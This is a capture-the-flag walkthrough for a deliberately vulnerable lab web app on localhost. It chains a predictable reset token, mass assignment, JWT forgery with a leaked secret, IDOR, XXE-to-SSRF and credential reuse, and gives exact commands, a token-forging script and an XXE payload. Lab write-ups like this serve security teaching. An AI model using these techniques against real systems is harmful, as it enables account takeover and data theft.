# Darkly v2 — Step-by-step reproduction (with real outputs)

Every flag, how it was discovered, the exact commands, and the **actual output** seen.
Tokens/ids are per-run; the shapes match. Target: `http://localhost:4942` (app) and
`http://localhost:8090` (internal PocketBase).

> Notation: `$` lines are commands; the block under each is the real output.

---

## Recon (how the roadmap was found)

The HTML source, `robots.txt` and the forum leak almost everything. Key signals:

- Response headers on every request leak the stack and the backend:
  `x-powered-by: Python/3.11 FastAPI/0.104`, `x-pocketbase: http://localhost:8090`,
  `x-42-internal: campus=paris`.
- Home-page HTML comments: *"v1 had SQL in the login form… fixed it. probably"*,
  *"migrate session cookie to httponly=true"*, *"replace stdlib xml.etree with
  defusedxml"*, *"/internal/config restricted to localhost only"*.
- `/staff` (200, no auth) states the bugs outright: *"Try PATCH /api/profile with the
  right fields"*, *"File uploads: Enabled (unrestricted)"*, *"XML parser: stdlib ET
  (unsafe)"*, *"Session cookie: httponly=false"*.
- `/forum` leaks users (jdoe=emilie, benjamin, dorian, thanos, wil, sophie…) and the
  deploy log: *"jwt secret was '42'. wil changed it to '42network'"*,
  *"disabled defusedxml temporarily"*, *"removed the [upload] whitelist entirely"*,
  and benjamin's note that the reset *"token was just…"* (predictable).

Run it yourself: `./recon/recon.sh`.

---

## Flag 1 — Predictable & disclosed password-reset token

**Discovery:** the forum hints the reset is weak; the reset page posts to
`/reset-password/request`. Requesting a reset **redirects with the token in the URL**
(no email), and the token is exactly `md5(email)`.

```
$ printf '%s' 'dorian@student.42.tech' | md5 -q          # token = md5(email)
5dd6bc746080d6133d898694c3f8e9d8

$ curl -sS -i -X POST http://localhost:4942/reset-password/request --data 'email=dorian@student.42.tech' | grep -i '^location'
location: /reset-password?email=dorian@student.42.tech&token=5dd6bc746080d6133d898694c3f8e9d8
```

The token in the redirect == `md5(email)`. Now set a new password and log in:

```
$ curl -sS -o /dev/null -w 'confirm -> %{redirect_url}\n' -X POST http://localhost:4942/reset-password/confirm \
    --data "email=dorian@student.42.tech&token=$(printf '%s' dorian@student.42.tech|md5 -q)&new_password=Pwn3d!123"
confirm -> http://localhost:4942/login?success=Password+updated

$ curl -sS -c dorian.jar -o /dev/null -w 'login -> %{redirect_url}\n' -X POST http://localhost:4942/login \
    --data 'identity=dorian@student.42.tech&password=Pwn3d!123'
login -> http://localhost:4942/
# cookie set: session=<JWT>  (role:student)
```

Note: staff/god accounts are excluded ("use 42 SSO"), so target a **student**
(benjamin / dorian / thanos). The flag itself lives in the account's `recovery_code`
field, read via Flag 4: **`FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`**.

---

## Flag 2 — Mass assignment (student → cadet)

**Discovery:** `/staff` says *"Cadet access required. Try PATCH /api/profile with the
right fields."* `GET /api/profile` is 405 (only PATCH). PATCH echoes the full record and
writes any field we send.

```
$ curl -sS -b "session=$J" -X PATCH http://localhost:4942/api/profile -H 'Content-Type: application/json' -d '{"role":"cadet"}' | python3 -m json.tool | grep -E 'role|recovery'
    "recovery_code": "FLAG{r3s3t_t0k3n_w4s_just_md5_lol}",
    "role": "cadet",
```

The role is cached in the JWT, so re-login to mint a cadet token, then open the
cadet-gated dashboard:

```
$ curl -sS -c ben.jar -X POST http://localhost:4942/login --data 'identity=benjamin@student.42.tech&password=Pwn3d!123' >/dev/null
$ J=$(grep session ben.jar|awk '{print $NF}'); echo $J | cut -d. -f2 | tr '_-' '/+' | base64 -D
{"sub":"8l16vboi47dmand","login":"benjamin","role":"cadet","exp":...}

$ curl -sS -b "session=$J" http://localhost:4942/staff/dashboard | grep -oE 'FLAG\{[^}]*\}' | head -1
FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
```

Server rejects `staff`/`god` here ("role not assignable") — that step is Flag 3.

---

## Flag 3 — Weak / leaked JWT secret (forge the god account)

**Discovery:** the session cookie is an HS256 JWT; the forum leaked the secret
`42network`. A tampered signature or `alg:none` is **rejected** (so the secret is the
only lock). `/admin` resolves the user from `sub` and checks the **DB** role, so forge a
token for the real god account **sophie** (id `enplwhu8jfo56oi`, from Flag 4's list).

```
$ python3 - > sophie.jwt <<'PY'
import hmac,hashlib,base64,json,time
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
h=b(b'{"alg":"HS256","typ":"JWT"}')
p=b(json.dumps({"sub":"enplwhu8jfo56oi","login":"sophie","role":"god","exp":int(time.time())+9999},separators=(',',':')).encode())
print((h+b'.'+p+b'.'+b(hmac.new(b'42network',h+b'.'+p,hashlib.sha256).digest())).decode())
PY

$ curl -sS -b "session=$(cat sophie.jwt)" http://localhost:4942/admin | grep -oE 'FLAG\{[^}]*\}' | head -1
FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}
```

---

## Flag 4 — IDOR on `/api/users/<id>`

**Discovery:** `/api/users` lists every user (enumeration); `/api/users/<id>` returns
any user's **full** record with no ownership check, over-exposing `private_note`,
`recovery_code`, `pw_hint`.

```
$ curl -sS -b "session=$J" http://localhost:4942/api/users | python3 -c "import sys,json;[print(u['id'],u['username'],u['role']) for u in json.load(sys.stdin)['users']]"
z4p1cnx47mfy50f jdoe student
8l16vboi47dmand benjamin student
02g7nfbtw0k83fu dorian student
...
k1asdfeditojrb4 wil staff
enplwhu8jfo56oi sophie god

$ curl -sS -b "session=$J" http://localhost:4942/api/users/k1asdfeditojrb4 | python3 -m json.tool | grep -E 'username|private_note|recovery_code'
    "private_note": "FLAG{1d0r_ur_pr0f1l3_1s_m1n3}",
    "recovery_code": "",
    "username": "wil",
```

Two flags surface via this endpoint: wil's `private_note`
(**`FLAG{1d0r_ur_pr0f1l3_1s_m1n3}`**) and any student's `recovery_code`
(**`FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`** = Flag 1). Bonus: every `pw_hint` is an
unsalted md5 (jdoe's = `md5("abc123")`), so passwords crack instantly.

---

## Flag 5 — XXE → SSRF → localhost-only config

**Discovery:** `/agenda/import` parses XML with entity resolution on (defusedxml
disabled). `file://` entities return empty, but an **HTTP** external entity is fetched
**by the server from loopback**, bypassing the `/internal/config` localhost gate. The
`<title>` is reflected in the import result table.

```
$ cat xxe.xml
<?xml version="1.0"?>
<!DOCTYPE a [ <!ENTITY x SYSTEM "http://localhost:4942/internal/config"> ]>
<agenda><event><title>&x;</title><date>2042-01-01</date></event></agenda>

$ curl -sS -b "session=$J" -F 'file=@xxe.xml;type=text/xml' http://localhost:4942/agenda/import \
    | python3 -c "import sys,html,re;print(html.unescape(re.findall(r'<td[^>]*>(.*?)</td>',sys.stdin.read(),re.S)[0]))"
{"jwt_secret":"42network","pb_admin_email":"admin@42network.local","pb_admin_password":"Darkly42Admin!","app_version":"1.0.0","campus":"wilcity","darkly_flag":"FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}"}
```

Flag: **`FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`**. This also leaks the **PocketBase
superuser credentials** used in Flag 6. (Direct access without SSRF is blocked:
`curl /internal/config` → `403 {"error":"forbidden"}`, and `X-Forwarded-For` spoofing
does not help — QEMU NAT makes our requests appear as `10.0.2.2`, not loopback.)

---

## Flag 6 — PocketBase superuser (credential reuse)

**Discovery:** the config (Flag 5) leaked `admin@42network.local` / `Darkly42Admin!`.
PocketBase runs internally on `:8090` (leaked by the `x-pocketbase` header; its admin UI
`/_/` is disallowed in robots.txt — the flag name nods to that). Authenticate as
superuser and read the audit collection.

```
$ curl -sS -X POST http://localhost:8090/api/admins/auth-with-password -H 'Content-Type: application/json' \
    -d '{"identity":"admin@42network.local","password":"Darkly42Admin!"}' | python3 -c "import sys,json;print('token:',json.load(sys.stdin)['token'][:40]+'...')"
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...

$ T=$(curl -sS -X POST http://localhost:8090/api/admins/auth-with-password -H 'Content-Type: application/json' -d '{"identity":"admin@42network.local","password":"Darkly42Admin!"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
$ curl -sS http://localhost:8090/api/collections/internal_audit/records -H "Authorization: $T" | python3 -m json.tool | grep note
            "note": "god-tier export OK — flag retained for the security audit: FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}",
```

Flag: **`FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}`**. This is the application's true
admin (PocketBase superuser) reached entirely from a chain of web weaknesses:
info-disclosure → XXE → SSRF → credential reuse.

Note (PocketBase version): this build is pre-0.23, so admin auth is
`/api/admins/auth-with-password`. On 0.23+ it is
`/api/collections/_superusers/auth-with-password`.
